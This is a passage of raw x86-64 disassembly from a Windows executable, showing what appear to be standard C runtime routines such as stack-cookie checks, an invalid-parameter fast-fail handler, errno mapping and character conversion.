   140004966:	75 3b                	jne    0x1400049a3
   140004968:	ff 15 4a 0d 03 00    	call   *0x30d4a(%rip)        # 0x1400356b8
   14000496e:	89 44 24 30          	mov    %eax,0x30(%rsp)
   140004972:	40 38 7b 10          	cmp    %dil,0x10(%rbx)
   140004976:	75 0a                	jne    0x140004982
   140004978:	48 89 7b 08          	mov    %rdi,0x8(%rbx)
   14000497c:	c6 43 10 01          	movb   $0x1,0x10(%rbx)
   140004980:	eb 04                	jmp    0x140004986
   140004982:	48 8b 7b 08          	mov    0x8(%rbx),%rdi
   140004986:	48 8b d7             	mov    %rdi,%rdx
   140004989:	48 8d 4c 24 30       	lea    0x30(%rsp),%rcx
   14000498e:	e8 9d 0b 00 00       	call   0x140005530
   140004993:	8b 4c 24 30          	mov    0x30(%rsp),%ecx
   140004997:	48 8b f0             	mov    %rax,%rsi
   14000499a:	48 89 03             	mov    %rax,(%rbx)
   14000499d:	ff 15 1d 0d 03 00    	call   *0x30d1d(%rip)        # 0x1400356c0
   1400049a3:	48 8b 5c 24 38       	mov    0x38(%rsp),%rbx
   1400049a8:	48 8b c6             	mov    %rsi,%rax
   1400049ab:	48 8b 74 24 40       	mov    0x40(%rsp),%rsi
   1400049b0:	48 83 c4 20          	add    $0x20,%rsp
   1400049b4:	5f                   	pop    %rdi
   1400049b5:	c3                   	ret
   1400049b6:	cc                   	int3
   1400049b7:	cc                   	int3
   1400049b8:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   1400049bd:	48 89 74 24 10       	mov    %rsi,0x10(%rsp)
   1400049c2:	57                   	push   %rdi
   1400049c3:	48 83 ec 20          	sub    $0x20,%rsp
   1400049c7:	33 db                	xor    %ebx,%ebx
   1400049c9:	48 8b fa             	mov    %rdx,%rdi
   1400049cc:	48 8b f1             	mov    %rcx,%rsi
   1400049cf:	38 5a 10             	cmp    %bl,0x10(%rdx)
   1400049d2:	75 18                	jne    0x1400049ec
   1400049d4:	ff 15 de 0c 03 00    	call   *0x30cde(%rip)        # 0x1400356b8
   1400049da:	8b c8                	mov    %eax,%ecx
   1400049dc:	48 89 5f 08          	mov    %rbx,0x8(%rdi)
   1400049e0:	c6 47 10 01          	movb   $0x1,0x10(%rdi)
   1400049e4:	ff 15 d6 0c 03 00    	call   *0x30cd6(%rip)        # 0x1400356c0
   1400049ea:	eb 04                	jmp    0x1400049f0
   1400049ec:	48 8b 5a 08          	mov    0x8(%rdx),%rbx
   1400049f0:	48 8d 04 de          	lea    (%rsi,%rbx,8),%rax
   1400049f4:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   1400049f9:	48 8b 74 24 38       	mov    0x38(%rsp),%rsi
   1400049fe:	48 83 c4 20          	add    $0x20,%rsp
   140004a02:	5f                   	pop    %rdi
   140004a03:	c3                   	ret
   140004a04:	48 89 5c 24 10       	mov    %rbx,0x10(%rsp)
   140004a09:	48 89 74 24 18       	mov    %rsi,0x18(%rsp)
   140004a0e:	55                   	push   %rbp
   140004a0f:	57                   	push   %rdi
   140004a10:	41 56                	push   %r14
   140004a12:	48 8d ac 24 10 fb ff 	lea    -0x4f0(%rsp),%rbp
   140004a19:	ff 
   140004a1a:	48 81 ec f0 05 00 00 	sub    $0x5f0,%rsp
   140004a21:	48 8b 05 88 f5 03 00 	mov    0x3f588(%rip),%rax        # 0x140043fb0
   140004a28:	48 33 c4             	xor    %rsp,%rax
   140004a2b:	48 89 85 e0 04 00 00 	mov    %rax,0x4e0(%rbp)
   140004a32:	41 8b f8             	mov    %r8d,%edi
   140004a35:	8b f2                	mov    %edx,%esi
   140004a37:	8b d9                	mov    %ecx,%ebx
   140004a39:	83 f9 ff             	cmp    $0xffffffff,%ecx
   140004a3c:	74 05                	je     0x140004a43
   140004a3e:	e8 9d 4d 00 00       	call   0x1400097e0
   140004a43:	33 d2                	xor    %edx,%edx
   140004a45:	48 8d 4c 24 70       	lea    0x70(%rsp),%rcx
   140004a4a:	41 b8 98 00 00 00    	mov    $0x98,%r8d
   140004a50:	e8 3b 62 00 00       	call   0x14000ac90
   140004a55:	33 d2                	xor    %edx,%edx
   140004a57:	48 8d 4d 10          	lea    0x10(%rbp),%rcx
   140004a5b:	41 b8 d0 04 00 00    	mov    $0x4d0,%r8d
   140004a61:	e8 2a 62 00 00       	call   0x14000ac90
   140004a66:	48 83 64 24 48 00    	andq   $0x0,0x48(%rsp)
   140004a6c:	48 8d 44 24 70       	lea    0x70(%rsp),%rax
   140004a71:	48 83 64 24 40 00    	andq   $0x0,0x40(%rsp)
   140004a77:	48 8d 4d 10          	lea    0x10(%rbp),%rcx
   140004a7b:	48 83 64 24 50 00    	andq   $0x0,0x50(%rsp)
   140004a81:	48 89 44 24 58       	mov    %rax,0x58(%rsp)
   140004a86:	48 8d 45 10          	lea    0x10(%rbp),%rax
   140004a8a:	48 89 44 24 60       	mov    %rax,0x60(%rsp)
   140004a8f:	ff 15 bb 0f 03 00    	call   *0x30fbb(%rip)        # 0x140035a50
   140004a95:	4c 8b b5 08 01 00 00 	mov    0x108(%rbp),%r14
   140004a9c:	48 8d 54 24 40       	lea    0x40(%rsp),%rdx
   140004aa1:	49 8b ce             	mov    %r14,%rcx
   140004aa4:	45 33 c0             	xor    %r8d,%r8d
   140004aa7:	ff 15 9b 0f 03 00    	call   *0x30f9b(%rip)        # 0x140035a48
   140004aad:	48 85 c0             	test   %rax,%rax
   140004ab0:	74 36                	je     0x140004ae8
   140004ab2:	48 83 64 24 38 00    	andq   $0x0,0x38(%rsp)
   140004ab8:	48 8d 4c 24 48       	lea    0x48(%rsp),%rcx
   140004abd:	48 8b 54 24 40       	mov    0x40(%rsp),%rdx
   140004ac2:	4c 8b c8             	mov    %rax,%r9
   140004ac5:	48 89 4c 24 30       	mov    %rcx,0x30(%rsp)
   140004aca:	4d 8b c6             	mov    %r14,%r8
   140004acd:	48 8d 4c 24 50       	lea    0x50(%rsp),%rcx
   140004ad2:	48 89 4c 24 28       	mov    %rcx,0x28(%rsp)
   140004ad7:	48 8d 4d 10          	lea    0x10(%rbp),%rcx
   140004adb:	48 89 4c 24 20       	mov    %rcx,0x20(%rsp)
   140004ae0:	33 c9                	xor    %ecx,%ecx
   140004ae2:	ff 15 58 0f 03 00    	call   *0x30f58(%rip)        # 0x140035a40
   140004ae8:	48 8b 85 08 05 00 00 	mov    0x508(%rbp),%rax
   140004aef:	48 89 85 08 01 00 00 	mov    %rax,0x108(%rbp)
   140004af6:	48 8d 85 08 05 00 00 	lea    0x508(%rbp),%rax
   140004afd:	48 83 c0 08          	add    $0x8,%rax
   140004b01:	89 74 24 70          	mov    %esi,0x70(%rsp)
   140004b05:	48 89 85 a8 00 00 00 	mov    %rax,0xa8(%rbp)
   140004b0c:	48 8b 85 08 05 00 00 	mov    0x508(%rbp),%rax
   140004b13:	48 89 45 80          	mov    %rax,-0x80(%rbp)
   140004b17:	89 7c 24 74          	mov    %edi,0x74(%rsp)
   140004b1b:	ff 15 7f 0b 03 00    	call   *0x30b7f(%rip)        # 0x1400356a0
   140004b21:	33 c9                	xor    %ecx,%ecx
   140004b23:	8b f8                	mov    %eax,%edi
   140004b25:	ff 15 85 0b 03 00    	call   *0x30b85(%rip)        # 0x1400356b0
   140004b2b:	48 8d 4c 24 58       	lea    0x58(%rsp),%rcx
   140004b30:	ff 15 72 0b 03 00    	call   *0x30b72(%rip)        # 0x1400356a8
   140004b36:	85 c0                	test   %eax,%eax
   140004b38:	75 10                	jne    0x140004b4a
   140004b3a:	85 ff                	test   %edi,%edi
   140004b3c:	75 0c                	jne    0x140004b4a
   140004b3e:	83 fb ff             	cmp    $0xffffffff,%ebx
   140004b41:	74 07                	je     0x140004b4a
   140004b43:	8b cb                	mov    %ebx,%ecx
   140004b45:	e8 96 4c 00 00       	call   0x1400097e0
   140004b4a:	48 8b 8d e0 04 00 00 	mov    0x4e0(%rbp),%rcx
   140004b51:	48 33 cc             	xor    %rsp,%rcx
   140004b54:	e8 f7 47 00 00       	call   0x140009350
   140004b59:	4c 8d 9c 24 f0 05 00 	lea    0x5f0(%rsp),%r11
   140004b60:	00 
   140004b61:	49 8b 5b 28          	mov    0x28(%r11),%rbx
   140004b65:	49 8b 73 30          	mov    0x30(%r11),%rsi
   140004b69:	49 8b e3             	mov    %r11,%rsp
   140004b6c:	41 5e                	pop    %r14
   140004b6e:	5f                   	pop    %rdi
   140004b6f:	5d                   	pop    %rbp
   140004b70:	c3                   	ret
   140004b71:	cc                   	int3
   140004b72:	cc                   	int3
   140004b73:	cc                   	int3
   140004b74:	48 89 0d 05 f7 03 00 	mov    %rcx,0x3f705(%rip)        # 0x140044280
   140004b7b:	c3                   	ret
   140004b7c:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140004b81:	55                   	push   %rbp
   140004b82:	48 8b ec             	mov    %rsp,%rbp
   140004b85:	48 83 ec 70          	sub    $0x70,%rsp
   140004b89:	48 83 65 c0 00       	andq   $0x0,-0x40(%rbp)
   140004b8e:	83 3d f3 f6 03 00 00 	cmpl   $0x0,0x3f6f3(%rip)        # 0x140044288
   140004b95:	c6 45 d0 00          	movb   $0x0,-0x30(%rbp)
   140004b99:	c6 45 e8 00          	movb   $0x0,-0x18(%rbp)
   140004b9d:	c6 45 f0 00          	movb   $0x0,-0x10(%rbp)
   140004ba1:	c6 45 f8 00          	movb   $0x0,-0x8(%rbp)
   140004ba5:	75 10                	jne    0x140004bb7
   140004ba7:	0f 10 05 aa e5 03 00 	movups 0x3e5aa(%rip),%xmm0        # 0x140043158
   140004bae:	c6 45 e8 01          	movb   $0x1,-0x18(%rbp)
   140004bb2:	f3 0f 7f 45 d8       	movdqu %xmm0,-0x28(%rbp)
   140004bb7:	48 8d 45 c0          	lea    -0x40(%rbp),%rax
   140004bbb:	48 89 44 24 28       	mov    %rax,0x28(%rsp)
   140004bc0:	48 8b 45 30          	mov    0x30(%rbp),%rax
   140004bc4:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   140004bc9:	e8 4a 00 00 00       	call   0x140004c18
   140004bce:	80 7d e8 02          	cmpb   $0x2,-0x18(%rbp)
   140004bd2:	75 0b                	jne    0x140004bdf
   140004bd4:	48 8b 45 c0          	mov    -0x40(%rbp),%rax
   140004bd8:	83 a0 a8 03 00 00 fd 	andl   $0xfffffffd,0x3a8(%rax)
   140004bdf:	80 7d f0 00          	cmpb   $0x0,-0x10(%rbp)
   140004be3:	74 0f                	je     0x140004bf4
   140004be5:	8b 5d ec             	mov    -0x14(%rbp),%ebx
   140004be8:	48 8d 4d c0          	lea    -0x40(%rbp),%rcx
   140004bec:	e8 f3 fc ff ff       	call   0x1400048e4
   140004bf1:	89 58 20             	mov    %ebx,0x20(%rax)
   140004bf4:	80 7d f8 00          	cmpb   $0x0,-0x8(%rbp)
   140004bf8:	74 0f                	je     0x140004c09
   140004bfa:	8b 5d f4             	mov    -0xc(%rbp),%ebx
   140004bfd:	48 8d 4d c0          	lea    -0x40(%rbp),%rcx
   140004c01:	e8 de fc ff ff       	call   0x1400048e4
   140004c06:	89 58 24             	mov    %ebx,0x24(%rax)
   140004c09:	48 8b 9c 24 80 00 00 	mov    0x80(%rsp),%rbx
   140004c10:	00 
   140004c11:	48 83 c4 70          	add    $0x70,%rsp
   140004c15:	5d                   	pop    %rbp
   140004c16:	c3                   	ret
   140004c17:	cc                   	int3
   140004c18:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140004c1d:	48 89 6c 24 10       	mov    %rbp,0x10(%rsp)
   140004c22:	48 89 74 24 18       	mov    %rsi,0x18(%rsp)
   140004c27:	57                   	push   %rdi
   140004c28:	48 83 ec 30          	sub    $0x30,%rsp
   140004c2c:	48 8b e9             	mov    %rcx,%rbp
   140004c2f:	41 8b d9             	mov    %r9d,%ebx
   140004c32:	48 8b 4c 24 68       	mov    0x68(%rsp),%rcx
   140004c37:	49 8b f8             	mov    %r8,%rdi
   140004c3a:	48 8b f2             	mov    %rdx,%rsi
   140004c3d:	e8 0a fd ff ff       	call   0x14000494c
   140004c42:	48 85 c0             	test   %rax,%rax
   140004c45:	74 3d                	je     0x140004c84
   140004c47:	48 8b 80 b8 03 00 00 	mov    0x3b8(%rax),%rax
   140004c4e:	48 85 c0             	test   %rax,%rax
   140004c51:	74 31                	je     0x140004c84
   140004c53:	44 8b cb             	mov    %ebx,%r9d
   140004c56:	4c 8b c7             	mov    %rdi,%r8
   140004c59:	48 8b d6             	mov    %rsi,%rdx
   140004c5c:	48 8b 4c 24 60       	mov    0x60(%rsp),%rcx
   140004c61:	48 89 4c 24 20       	mov    %rcx,0x20(%rsp)
   140004c66:	48 8b cd             	mov    %rbp,%rcx
   140004c69:	ff 15 11 0e 03 00    	call   *0x30e11(%rip)        # 0x140035a80
   140004c6f:	48 8b 5c 24 40       	mov    0x40(%rsp),%rbx
   140004c74:	48 8b 6c 24 48       	mov    0x48(%rsp),%rbp
   140004c79:	48 8b 74 24 50       	mov    0x50(%rsp),%rsi
   140004c7e:	48 83 c4 30          	add    $0x30,%rsp
   140004c82:	5f                   	pop    %rdi
   140004c83:	c3                   	ret
   140004c84:	48 8b 54 24 68       	mov    0x68(%rsp),%rdx
   140004c89:	48 8d 0d f0 f5 03 00 	lea    0x3f5f0(%rip),%rcx        # 0x140044280
   140004c90:	e8 23 fd ff ff       	call   0x1400049b8
   140004c95:	44 8b cb             	mov    %ebx,%r9d
   140004c98:	4c 8b c7             	mov    %rdi,%r8
   140004c9b:	48 8b d6             	mov    %rsi,%rdx
   140004c9e:	4c 8b 10             	mov    (%rax),%r10
   140004ca1:	48 8b 05 08 f3 03 00 	mov    0x3f308(%rip),%rax        # 0x140043fb0
   140004ca8:	4c 33 d0             	xor    %rax,%r10
   140004cab:	8b c8                	mov    %eax,%ecx
   140004cad:	83 e1 3f             	and    $0x3f,%ecx
   140004cb0:	49 d3 ca             	ror    %cl,%r10
   140004cb3:	4d 85 d2             	test   %r10,%r10
   140004cb6:	74 05                	je     0x140004cbd
   140004cb8:	49 8b c2             	mov    %r10,%rax
   140004cbb:	eb 9f                	jmp    0x140004c5c
   140004cbd:	48 8b 44 24 60       	mov    0x60(%rsp),%rax
   140004cc2:	48 8b cd             	mov    %rbp,%rcx
   140004cc5:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   140004cca:	e8 51 00 00 00       	call   0x140004d20
   140004ccf:	cc                   	int3
   140004cd0:	48 83 ec 38          	sub    $0x38,%rsp
   140004cd4:	48 83 64 24 20 00    	andq   $0x0,0x20(%rsp)
   140004cda:	45 33 c9             	xor    %r9d,%r9d
   140004cdd:	45 33 c0             	xor    %r8d,%r8d
   140004ce0:	33 d2                	xor    %edx,%edx
   140004ce2:	33 c9                	xor    %ecx,%ecx
   140004ce4:	e8 93 fe ff ff       	call   0x140004b7c
   140004ce9:	48 83 c4 38          	add    $0x38,%rsp
   140004ced:	c3                   	ret
   140004cee:	cc                   	int3
   140004cef:	cc                   	int3
   140004cf0:	48 83 ec 38          	sub    $0x38,%rsp
   140004cf4:	48 83 64 24 20 00    	andq   $0x0,0x20(%rsp)
   140004cfa:	45 33 c9             	xor    %r9d,%r9d
   140004cfd:	45 33 c0             	xor    %r8d,%r8d
   140004d00:	33 d2                	xor    %edx,%edx
   140004d02:	33 c9                	xor    %ecx,%ecx
   140004d04:	e8 73 fe ff ff       	call   0x140004b7c
   140004d09:	48 83 64 24 20 00    	andq   $0x0,0x20(%rsp)
   140004d0f:	45 33 c9             	xor    %r9d,%r9d
   140004d12:	45 33 c0             	xor    %r8d,%r8d
   140004d15:	33 d2                	xor    %edx,%edx
   140004d17:	33 c9                	xor    %ecx,%ecx
   140004d19:	e8 02 00 00 00       	call   0x140004d20
   140004d1e:	cc                   	int3
   140004d1f:	cc                   	int3
   140004d20:	48 83 ec 28          	sub    $0x28,%rsp
   140004d24:	b9 17 00 00 00       	mov    $0x17,%ecx
   140004d29:	ff 15 a9 09 03 00    	call   *0x309a9(%rip)        # 0x1400356d8
   140004d2f:	85 c0                	test   %eax,%eax
   140004d31:	74 07                	je     0x140004d3a
   140004d33:	b9 05 00 00 00       	mov    $0x5,%ecx
   140004d38:	cd 29                	int    $0x29
   140004d3a:	41 b8 01 00 00 00    	mov    $0x1,%r8d
   140004d40:	ba 17 04 00 c0       	mov    $0xc0000417,%edx
   140004d45:	41 8d 48 01          	lea    0x1(%r8),%ecx
   140004d49:	e8 b6 fc ff ff       	call   0x140004a04
   140004d4e:	ff 15 74 09 03 00    	call   *0x30974(%rip)        # 0x1400356c8
   140004d54:	48 8b c8             	mov    %rax,%rcx
   140004d57:	ba 17 04 00 c0       	mov    $0xc0000417,%edx
   140004d5c:	48 83 c4 28          	add    $0x28,%rsp
   140004d60:	48 ff 25 69 09 03 00 	rex.W jmp *0x30969(%rip)        # 0x1400356d0
   140004d67:	cc                   	int3
   140004d68:	48 89 5c 24 10       	mov    %rbx,0x10(%rsp)
   140004d6d:	66 89 4c 24 08       	mov    %cx,0x8(%rsp)
   140004d72:	55                   	push   %rbp
   140004d73:	48 8b ec             	mov    %rsp,%rbp
   140004d76:	48 83 ec 50          	sub    $0x50,%rsp
   140004d7a:	b8 ff ff 00 00       	mov    $0xffff,%eax
   140004d7f:	66 3b c8             	cmp    %ax,%cx
   140004d82:	0f 84 cf 00 00 00    	je     0x140004e57
   140004d88:	48 8d 4d e0          	lea    -0x20(%rbp),%rcx
   140004d8c:	e8 7f f2 ff ff       	call   0x140004010
   140004d91:	4c 8b 55 e8          	mov    -0x18(%rbp),%r10
   140004d95:	33 db                	xor    %ebx,%ebx
   140004d97:	41 bb 00 01 00 00    	mov    $0x100,%r11d
   140004d9d:	41 81 7a 0c e9 fd 00 	cmpl   $0xfde9,0xc(%r10)
   140004da4:	00 
   140004da5:	75 29                	jne    0x140004dd0
   140004da7:	0f b7 4d 10          	movzwl 0x10(%rbp),%ecx
   140004dab:	41 8d 43 80          	lea    -0x80(%r11),%eax
   140004daf:	66 3b c8             	cmp    %ax,%cx
   140004db2:	73 56                	jae    0x140004e0a
   140004db4:	0f b6 c1             	movzbl %cl,%eax
   140004db7:	4c 8d 05 72 1d 03 00 	lea    0x31d72(%rip),%r8        # 0x140036b30
   140004dbe:	41 f6 44 40 02 01    	testb  $0x1,0x2(%r8,%rax,2)
   140004dc4:	74 05                	je     0x140004dcb
   140004dc6:	0f b6 c9             	movzbl %cl,%ecx
   140004dc9:	eb 24                	jmp    0x140004def
   140004dcb:	0f b6 d1             	movzbl %cl,%edx
   140004dce:	eb 74                	jmp    0x140004e44
   140004dd0:	0f b7 55 10          	movzwl 0x10(%rbp),%edx
   140004dd4:	66 41 3b d3          	cmp    %r11w,%dx
   140004dd8:	73 27                	jae    0x140004e01
   140004dda:	0f b6 c2             	movzbl %dl,%eax
   140004ddd:	4c 8d 05 4c 1d 03 00 	lea    0x31d4c(%rip),%r8        # 0x140036b30
   140004de4:	41 f6 44 40 02 01    	testb  $0x1,0x2(%r8,%rax,2)
   140004dea:	74 10                	je     0x140004dfc
   140004dec:	0f b6 ca             	movzbl %dl,%ecx
   140004def:	49 8b 82 10 01 00 00 	mov    0x110(%r10),%rax
   140004df6:	0f b6 14 08          	movzbl (%rax,%rcx,1),%edx
   140004dfa:	eb 48                	jmp    0x140004e44
   140004dfc:	0f b6 d2             	movzbl %dl,%edx
   140004dff:	eb 43                	jmp    0x140004e44
   140004e01:	49 39 9a 38 01 00 00 	cmp    %rbx,0x138(%r10)
   140004e08:	74 3a                	je     0x140004e44
   140004e0a:	66 89 5d 20          	mov    %bx,0x20(%rbp)
   140004e0e:	48 8d 45 20          	lea    0x20(%rbp),%rax
   140004e12:	49 8b 8a 38 01 00 00 	mov    0x138(%r10),%rcx
   140004e19:	4c 8d 45 10          	lea    0x10(%rbp),%r8
   140004e1d:	c7 44 24 28 01 00 00 	movl   $0x1,0x28(%rsp)
   140004e24:	00 
   140004e25:	41 b9 01 00 00 00    	mov    $0x1,%r9d
   140004e2b:	41 8b d3             	mov    %r11d,%edx
   140004e2e:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   140004e33:	e8 9c 0a 00 00       	call   0x1400058d4
   140004e38:	0f b7 55 10          	movzwl 0x10(%rbp),%edx
   140004e3c:	85 c0                	test   %eax,%eax
   140004e3e:	74 04                	je     0x140004e44
   140004e40:	0f b7 55 20          	movzwl 0x20(%rbp),%edx
   140004e44:	38 5d f8             	cmp    %bl,-0x8(%rbp)
   140004e47:	74 0b                	je     0x140004e54
   140004e49:	48 8b 4d e0          	mov    -0x20(%rbp),%rcx
   140004e4d:	83 a1 a8 03 00 00 fd 	andl   $0xfffffffd,0x3a8(%rcx)
   140004e54:	0f b7 c2             	movzwl %dx,%eax
   140004e57:	48 8b 5c 24 68       	mov    0x68(%rsp),%rbx
   140004e5c:	48 83 c4 50          	add    $0x50,%rsp
   140004e60:	5d                   	pop    %rbp
   140004e61:	c3                   	ret
   140004e62:	cc                   	int3
   140004e63:	cc                   	int3
   140004e64:	33 d2                	xor    %edx,%edx
   140004e66:	e9 fd fe ff ff       	jmp    0x140004d68
   140004e6b:	cc                   	int3
   140004e6c:	33 c0                	xor    %eax,%eax
   140004e6e:	4c 8d 0d 8b 11 03 00 	lea    0x3118b(%rip),%r9        # 0x140036000
   140004e75:	49 8b d1             	mov    %r9,%rdx
   140004e78:	44 8d 40 08          	lea    0x8(%rax),%r8d
   140004e7c:	3b 0a                	cmp    (%rdx),%ecx
   140004e7e:	74 2b                	je     0x140004eab
   140004e80:	ff c0                	inc    %eax
   140004e82:	49 03 d0             	add    %r8,%rdx
   140004e85:	83 f8 2d             	cmp    $0x2d,%eax
   140004e88:	72 f2                	jb     0x140004e7c
   140004e8a:	8d 41 ed             	lea    -0x13(%rcx),%eax
   140004e8d:	83 f8 11             	cmp    $0x11,%eax
   140004e90:	77 06                	ja     0x140004e98
   140004e92:	b8 0d 00 00 00       	mov    $0xd,%eax
   140004e97:	c3                   	ret
   140004e98:	81 c1 44 ff ff ff    	add    $0xffffff44,%ecx
   140004e9e:	b8 16 00 00 00       	mov    $0x16,%eax
   140004ea3:	83 f9 0e             	cmp    $0xe,%ecx
   140004ea6:	41 0f 46 c0          	cmovbe %r8d,%eax
   140004eaa:	c3                   	ret
   140004eab:	41 8b 44 c1 04       	mov    0x4(%r9,%rax,8),%eax
   140004eb0:	c3                   	ret
   140004eb1:	cc                   	int3
   140004eb2:	cc                   	int3
   140004eb3:	cc                   	int3
   140004eb4:	40 53                	rex push %rbx
   140004eb6:	48 83 ec 20          	sub    $0x20,%rsp
   140004eba:	8b d9                	mov    %ecx,%ebx
   140004ebc:	e8 3f 00 00 00       	call   0x140004f00
   140004ec1:	8b cb                	mov    %ebx,%ecx
   140004ec3:	89 18                	mov    %ebx,(%rax)
   140004ec5:	e8 a2 ff ff ff       	call   0x140004e6c
   140004eca:	8b d8                	mov    %eax,%ebx
   140004ecc:	e8 53 00 00 00       	call   0x140004f24
   140004ed1:	89 18                	mov    %ebx,(%rax)
   140004ed3:	48 83 c4 20          	add    $0x20,%rsp
   140004ed7:	5b                   	pop    %rbx
   140004ed8:	c3                   	ret
   140004ed9:	cc                   	int3
   140004eda:	cc                   	int3
   140004edb:	cc                   	int3
   140004edc:	40 53                	rex push %rbx
   140004ede:	48 83 ec 20          	sub    $0x20,%rsp
   140004ee2:	48 8b da             	mov    %rdx,%rbx
   140004ee5:	c6 42 38 01          	movb   $0x1,0x38(%rdx)
   140004ee9:	89 4a 34             	mov    %ecx,0x34(%rdx)
   140004eec:	e8 7b ff ff ff       	call   0x140004e6c
   140004ef1:	89 43 2c             	mov    %eax,0x2c(%rbx)
   140004ef4:	c6 43 30 01          	movb   $0x1,0x30(%rbx)
   140004ef8:	48 83 c4 20          	add    $0x20,%rsp
   140004efc:	5b                   	pop    %rbx
   140004efd:	c3                   	ret
   140004efe:	cc                   	int3
   140004eff:	cc                   	int3
   140004f00:	48 83 ec 28          	sub    $0x28,%rsp
   140004f04:	e8 5f 05 00 00       	call   0x140005468
   140004f09:	48 85 c0             	test   %rax,%rax
   140004f0c:	48 8d 15 11 eb 03 00 	lea    0x3eb11(%rip),%rdx        # 0x140043a24
   140004f13:	48 8d 48 24          	lea    0x24(%rax),%rcx
   140004f17:	48 0f 44 ca          	cmove  %rdx,%rcx
   140004f1b:	48 8b c1             	mov    %rcx,%rax
   140004f1e:	48 83 c4 28          	add    $0x28,%rsp
   140004f22:	c3                   	ret
   140004f23:	cc                   	int3
   140004f24:	48 83 ec 28          	sub    $0x28,%rsp
   140004f28:	e8 3b 05 00 00       	call   0x140005468
   140004f2d:	48 85 c0             	test   %rax,%rax
   140004f30:	48 8d 15 e9 ea 03 00 	lea    0x3eae9(%rip),%rdx        # 0x140043a20
   140004f37:	48 8d 48 20          	lea    0x20(%rax),%rcx
   140004f3b:	48 0f 44 ca          	cmove  %rdx,%rcx
   140004f3f:	48 8b c1             	mov    %rcx,%rax
   140004f42:	48 83 c4 28          	add    $0x28,%rsp
   140004f46:	c3                   	ret
   140004f47:	cc                   	int3
   140004f48:	40 53                	rex push %rbx
   140004f4a:	48 83 ec 20          	sub    $0x20,%rsp
   140004f4e:	8b d9                	mov    %ecx,%ebx
   140004f50:	e8 13 05 00 00       	call   0x140005468
   140004f55:	48 85 c0             	test   %rax,%rax
   140004f58:	75 07                	jne    0x140004f61
   140004f5a:	b8 0c 00 00 00       	mov    $0xc,%eax
   140004f5f:	eb 09                	jmp    0x140004f6a
   140004f61:	e8 be ff ff ff       	call   0x140004f24
   140004f66:	89 18                	mov    %ebx,(%rax)
   140004f68:	33 c0                	xor    %eax,%eax
   140004f6a:	48 83 c4 20          	add    $0x20,%rsp
   140004f6e:	5b                   	pop    %rbx
   140004f6f:	c3                   	ret
   140004f70:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140004f75:	4c 89 4c 24 20       	mov    %r9,0x20(%rsp)
   140004f7a:	57                   	push   %rdi
   140004f7b:	48 83 ec 20          	sub    $0x20,%rsp
   140004f7f:	49 8b d9             	mov    %r9,%rbx
   140004f82:	49 8b f8             	mov    %r8,%rdi
   140004f85:	8b 0a                	mov    (%rdx),%ecx
   140004f87:	e8 dc 0e 00 00       	call   0x140005e68
   140004f8c:	90                   	nop
   140004f8d:	48 8b 07             	mov    (%rdi),%rax
   140004f90:	48 8b 08             	mov    (%rax),%rcx
   140004f93:	48 8b 81 88 00 00 00 	mov    0x88(%rcx),%rax
   140004f9a:	f0 ff 00             	lock incl (%rax)
   140004f9d:	8b 0b                	mov    (%rbx),%ecx
   140004f9f:	e8 24 0f 00 00       	call   0x140005ec8
   140004fa4:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   140004fa9:	48 83 c4 20          	add    $0x20,%rsp
   140004fad:	5f                   	pop    %rdi
   140004fae:	c3                   	ret
   140004faf:	cc                   	int3
   140004fb0:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140004fb5:	4c 89 4c 24 20       	mov    %r9,0x20(%rsp)
   140004fba:	57                   	push   %rdi
   140004fbb:	48 83 ec 20          	sub    $0x20,%rsp
   140004fbf:	49 8b d9             	mov    %r9,%rbx
   140004fc2:	49 8b f8             	mov    %r8,%rdi
   140004fc5:	8b 0a                	mov    (%rdx),%ecx
   140004fc7:	e8 9c 0e 00 00       	call   0x140005e68
   140004fcc:	90                   	nop
   140004fcd:	48 8b 0f             	mov    (%rdi),%rcx
   140004fd0:	33 d2                	xor    %edx,%edx
   140004fd2:	48 8b 09             	mov    (%rcx),%rcx
   140004fd5:	e8 ae 02 00 00       	call   0x140005288
   140004fda:	90                   	nop
   140004fdb:	8b 0b                	mov    (%rbx),%ecx
   140004fdd:	e8 e6 0e 00 00       	call   0x140005ec8
   140004fe2:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   140004fe7:	48 83 c4 20          	add    $0x20,%rsp
   140004feb:	5f                   	pop    %rdi
   140004fec:	c3                   	ret
   140004fed:	cc                   	int3
   140004fee:	cc                   	int3
   140004fef:	cc                   	int3
   140004ff0:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140004ff5:	4c 89 4c 24 20       	mov    %r9,0x20(%rsp)
   140004ffa:	57                   	push   %rdi
   140004ffb:	48 83 ec 20          	sub    $0x20,%rsp
   140004fff:	49 8b d9             	mov    %r9,%rbx
   140005002:	49 8b f8             	mov    %r8,%rdi
   140005005:	8b 0a                	mov    (%rdx),%ecx
   140005007:	e8 5c 0e 00 00       	call   0x140005e68
   14000500c:	90                   	nop
   14000500d:	48 8b 47 08          	mov    0x8(%rdi),%rax
   140005011:	48 8b 10             	mov    (%rax),%rdx
   140005014:	48 8b 0f             	mov    (%rdi),%rcx
   140005017:	48 8b 12             	mov    (%rdx),%rdx
   14000501a:	48 8b 09             	mov    (%rcx),%rcx
   14000501d:	e8 66 02 00 00       	call   0x140005288
   140005022:	90                   	nop
   140005023:	8b 0b                	mov    (%rbx),%ecx
   140005025:	e8 9e 0e 00 00       	call   0x140005ec8
   14000502a:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   14000502f:	48 83 c4 20          	add    $0x20,%rsp
   140005033:	5f                   	pop    %rdi
   140005034:	c3                   	ret
   140005035:	cc                   	int3
   140005036:	cc                   	int3
   140005037:	cc                   	int3
   140005038:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   14000503d:	4c 89 4c 24 20       	mov    %r9,0x20(%rsp)
   140005042:	57                   	push   %rdi
   140005043:	48 83 ec 20          	sub    $0x20,%rsp
   140005047:	49 8b d9             	mov    %r9,%rbx
   14000504a:	49 8b f8             	mov    %r8,%rdi
   14000504d:	8b 0a                	mov    (%rdx),%ecx
   14000504f:	e8 14 0e 00 00       	call   0x140005e68
